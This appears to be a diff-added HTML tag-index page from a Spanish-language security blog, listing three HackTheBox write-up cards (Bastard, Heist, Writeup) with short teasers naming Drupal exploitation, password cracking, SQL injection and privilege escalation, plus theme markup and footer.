+    <a class="smoothscroll badge badge-primary" href="/tags#TeamViewer">TeamViewer</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#UsoSvc">UsoSvc</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#windows-privileges">windows-privileges</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastard">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" alt="HackTheBox - Bastard"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastard">HackTheBox - Bastard</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/heist">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png" alt="HackTheBox - Heist"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/heist">HackTheBox - Heist</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de Firefox para ver que está...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">15 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/writeup">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" alt="HackTheBox - Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/writeup">HackTheBox - Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
